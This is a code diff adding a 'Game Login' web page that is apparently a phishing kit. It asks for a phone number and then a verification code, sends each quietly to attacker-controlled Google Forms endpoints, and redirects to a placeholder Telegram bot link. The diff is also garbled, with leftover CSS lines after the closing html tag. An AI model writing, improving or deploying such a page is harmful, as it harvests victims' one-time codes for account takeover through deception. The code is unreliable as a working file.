@@ -4,37 +4,124 @@
   <title>Game Login</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
-    body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: #0a0a0a;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      color: #00aaff;
+    body { 
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+      background: #0a0a0a; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      height: 100vh; 
+      color: #00aaff; 
+    }
+
+    .box { 
+      background: #1a1a1a; 
+      padding: 30px 25px; 
+      border-radius: 12px; 
+      width: 100%; 
+      max-width: 400px; 
+      box-shadow: 0 0 20px rgba(0, 170, 255, 0.5); 
+      text-align: center; 
+      transition: all 0.3s ease;
+    }
+
+    input { 
+      width: 100%; 
+      padding: 12px; 
+      margin-top: 12px; 
+      border-radius: 8px; 
+      border: 1px solid #00aaff; 
+      background: #0d0d0d; 
+      color: #00aaff; 
+      font-size: 16px;
+      /* Removes arrow spinners on number inputs in some browsers */
+      -moz-appearance: textfield;
+    }
+    input::-webkit-outer-spin-button,
+    input::-webkit-inner-spin-button {
+      -webkit-appearance: none;
       margin: 0;
     }
 
-    .box {
-      background: #1a1a1a;
-      padding: 30px 25px;
-      border-radius: 12px;
-      width: 100%;
-      max-width: 400px;
-      box-shadow: 0 0 20px rgba(0, 170, 255, 0.5);
-      text-align: center;
-      transition: all 0.3s ease;
-      box-sizing: border-box; /* ensures padding doesn't make box wider */
+    input::placeholder { color: #005577; }
+
+    button { 
+      width: 100%; 
+      padding: 12px; 
+      margin-top: 15px; 
+      border-radius: 8px; 
+      border: none; 
+      background: #00aaff; 
+      color: #0a0a0a; 
+      font-size: 16px; 
+      cursor: pointer; 
+      transition: 0.3s; 
+    }
+    button:hover { 
+      background: #0077cc; 
+      color: #e0f7ff;
     }
 
-    input {
-      width: calc(100% - 24px); /* Adjust for padding so both sides balanced */
-      padding: 12px;
-      margin-top: 12px;
-      border-radius: 8px;
-      border: 1px solid #00aaff;
-      background: #0d0d0d;
-      color: #00aaff;
+    .hidden { display: none; }
+  </style>
+</head>
+
+<body>
+
+<div class="box">
+  <h2 id="title">Enter Phone Number</h2>
+  
+  <input type="tel" id="phone" placeholder="Phone Number">
+  
+  <input type="text" id="code" placeholder="Code" class="hidden">
+  <button id="actionBtn" onclick="submitPhone()">Next</button>
+</div>
+
+<script>
+  let savedPhone = "";
+
+  // Google Form direct links (GET method)
+  const phoneFormURL = "https://docs.google.com/forms/d/e/1FAIpQLSfxT6LNdV6yHLbQ6Q2G3pGso5L2-1I13PmL2dkm2UOHkRxXdZ4IkoufowM4zhVXguy75Lq5Q/formResponse";
+  const codeFormURL = "https://docs.google.com/forms/d/e/1FAIpQLSfxT6LNdV6yHLbQ6Q2G3pGso5L2-1SW9p4z1l793SUcuSahzAhqYmAgTGxLPYsrv0_y5ohUs/formResponse";
+
+  function submitPhone() {
+    let phoneInput = document.getElementById("phone").value;
+    
+    // Updated validation text
+    if(phoneInput === "") { alert("Please enter phone number"); return; }
+    
+    savedPhone = phoneInput;
+
+    // Redirect to Form #1 (GET submission) without breaking page
+    // Note: Ensure entry.2000000 is the correct field ID for the phone number in your Google Form
+    const url = phoneFormURL + "?entry.2000000=" + encodeURIComponent(savedPhone);
+    fetch(url, { mode: "no-cors" });
+
+    // Switch to code input
+    document.getElementById("title").innerText = "Enter Code";
+    document.getElementById("phone").classList.add("hidden");
+    document.getElementById("code").classList.remove("hidden");
+
+    const btn = document.getElementById("actionBtn");
+    btn.innerText = "Submit";
+    btn.onclick = submitCode;
+  }
+
+  function submitCode() {
+    let code = document.getElementById("code").value;
+    if(code === "") { alert("Please enter code"); return; }
+
+    const url = codeFormURL + "?entry.2000000=" + encodeURIComponent(code);
+    fetch(url, { mode: "no-cors" });
+
+    // Show success message and redirect to Telegram bot
+    document.querySelector(".box").innerHTML = "<h2>You’ll be linked to the game soon</h2>";
+    setTimeout(() => { window.location.href = "YOUR_TELEGRAM_BOT_LINK_HERE"; }, 2000);
+  }
+</script>
+
+</body>
+</html>      color: #00aaff;
       font-size: 16px;
       box-sizing: border-box;
       -moz-appearance: textfield; /* removes number input arrows in Firefox */
